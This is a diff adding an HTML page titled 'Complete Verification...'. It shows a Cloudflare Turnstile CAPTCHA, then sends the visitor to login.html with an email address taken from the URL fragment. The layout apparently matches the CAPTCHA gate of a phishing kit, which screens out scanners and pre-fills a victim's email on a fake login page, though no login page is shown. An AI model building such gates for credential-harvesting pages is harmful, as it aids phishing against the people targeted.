@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: #f5f5f5;
+      }
+    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Complete Verification...</title>
+    <script
+      src="https://challenges.cloudflare.com/turnstile/v0/api.js"
+      async
+      defer
+    ></script>
+  </head>
+  <body>
+    <!-- Change the data-sitekey -->
+    <div
+      class="cf-turnstile"
+      data-sitekey="1x00000000000000000000AA"
+      data-theme="light"
+      data-callback="onCaptchaSuccess"
+    ></div>
+
+    <script>
+      function onCaptchaSuccess(token) {
+        console.log("CAPTCHA solved. Token:", token);
+
+        const email = window.location.hash.substring(1);
+
+        if (email) {
+          // Redirect to firstpage.html and append email as a query parameter
+          window.location.href = `login.html?email=${encodeURIComponent(email)}`;
+        } else {
+          window.location.href = `login.html?email=${encodeURIComponent(email)}`;
+          // alert("No email provided in the URL.");
+        }
+      }
+    </script>
+  </body>
+</html>
